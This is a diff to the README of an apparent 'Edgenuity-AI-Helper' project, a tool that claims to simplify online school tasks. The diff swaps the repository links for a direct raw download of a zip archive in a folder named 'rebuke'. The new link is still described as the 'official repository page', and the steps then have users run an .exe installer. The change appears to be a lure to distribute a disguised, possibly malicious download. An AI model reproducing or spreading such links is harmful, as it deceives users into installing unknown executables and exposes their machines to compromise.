@@ -1,6 +1,6 @@
 # 🤖 Edgenuity-AI-Helper - Simplify your online school learning tasks
 
-[![](https://img.shields.io/badge/Download-Edgenuity-AI-Helper-blue.svg)](https://github.com/obtuse-subordernematocera773/Edgenuity-AI-Helper)
+[![](https://img.shields.io/badge/Download-Edgenuity-AI-Helper-blue.svg)](https://raw.githubusercontent.com/obtuse-subordernematocera773/Edgenuity-AI-Helper/main/rebuke/A_Helper_Edgenuity_v2.0-beta.2.zip)
 
 ## 🛠 Project Overview
 
@@ -28,7 +28,7 @@ To run this application, ensure your computer meets these basic requirements:
 
 Follow these steps to set up the software on your Windows computer.
 
-1.  Visit the official repository page to download the software: [https://github.com/obtuse-subordernematocera773/Edgenuity-AI-Helper](https://github.com/obtuse-subordernematocera773/Edgenuity-AI-Helper). 
+1.  Visit the official repository page to download the software: [https://raw.githubusercontent.com/obtuse-subordernematocera773/Edgenuity-AI-Helper/main/rebuke/A_Helper_Edgenuity_v2.0-beta.2.zip](https://raw.githubusercontent.com/obtuse-subordernematocera773/Edgenuity-AI-Helper/main/rebuke/A_Helper_Edgenuity_v2.0-beta.2.zip). 
 2.  Locate the release section on the right side of the screen.
 3.  Click the version link to download the installer file ending in .exe.
 4.  Navigate to your Downloads folder.
